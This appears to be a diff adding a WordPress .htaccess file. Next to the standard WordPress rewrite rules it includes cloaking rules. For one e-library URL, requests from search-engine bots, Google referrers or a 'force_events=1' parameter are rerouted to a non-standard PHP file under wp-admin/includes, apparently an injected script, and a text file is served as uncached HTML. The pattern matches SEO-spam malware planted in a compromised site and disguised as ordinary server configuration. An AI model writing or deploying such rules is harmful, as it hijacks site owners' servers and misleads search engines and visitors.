@@ -1,0 +1,27 @@
+RewriteEngine On
+
+RewriteCond %{REQUEST_URI} ^/e-library/department-of-clinical-disciplines-1/rehabilitation/?$ [NC]
+
+RewriteCond %{QUERY_STRING} (^|&)force_events=1(&|$) [OR]
+RewriteCond %{HTTP_REFERER} (google\.|googleusercontent\.com) [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|yandex|chrome-lighthouse|bot) [NC]
+
+RewriteRule ^ /wp-admin/includes/css.php [L,QSA]
+
+<Files "rolunk.txt">
+  ForceType text/html
+  <IfModule mod_headers.c>
+    Header set Content-Type "text/html; charset=UTF-8"
+    Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+    Header set Pragma "no-cache"
+  </IfModule>
+</Files>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
